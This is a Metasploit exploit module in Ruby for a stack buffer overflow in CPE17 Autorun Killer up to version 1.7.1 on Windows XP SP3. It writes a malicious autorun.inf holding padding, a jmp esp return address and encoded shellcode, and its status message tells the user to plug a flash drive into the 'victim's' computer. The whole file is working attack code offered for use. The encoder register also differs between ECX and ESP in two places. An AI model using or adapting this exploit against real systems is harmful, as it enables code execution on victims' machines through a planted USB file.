#
# CPE17 Autorun Killer <= 1.7.1 Stack Buffer Overflow exploit
# by Xelenonz

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

      include Msf::Exploit::FILEFORMAT

      def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'CPE17 Autorun Killer <= 1.7.1 Stack Buffer Overflow exploit',
                        'Description'    => %q{
                                        readfile function is vulnerable it can be overflow  
                                             },
                        'Author'         => [ 'Xelenonz' ],
                        'Version'        => '0.1',
                        
                        'Payload'        =>
                                {
                                        'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
										'EncoderOptions' => {'BufferRegister'=>'ECX'},
                                },
			'DefaultOptions' =>
                				{
                    			'DisablePayloadHandler' => 'true',
                				},
                        'Platform'       => 'windows',

                        'Targets'        =>
                                [
                                        [
                                        	'Windows XP SP3',
                                          		{ 	'Ret' => 0x775a676f, 
                                          			'Offset' => 500 
                                          		} 
                                       ],
                                      
                                ],
                        'DefaultTarget' => 0,

                        'Privileged'     => false
                        ))

                        register_options(
                        [
                        	OptString.new('FILENAME',   [ true, 'The file name.',  'autorun.inf']),
                        ], self.class)
       end

       def exploit
       	  print_status("Encoding Payload ...")
          enc = framework.encoders.create("x86/alpha_mixed")
		  enc.datastore.import_options_from_hash( {'BufferRegister'=>'ESP'} )
		  hunter = enc.encode(payload.encoded, nil, nil, platform)
		  buffer = ""
          buffer << "A"*target['Offset'] # padding offset
          buffer << [target.ret].pack('V') # jmp esp
          buffer << hunter # shellcode
          print_status("Creating '#{datastore['FILENAME']}' file ...")
          file_create(buffer)
          print_status("Plug flashdrive to victim's computer")
          handler
          
       end
end
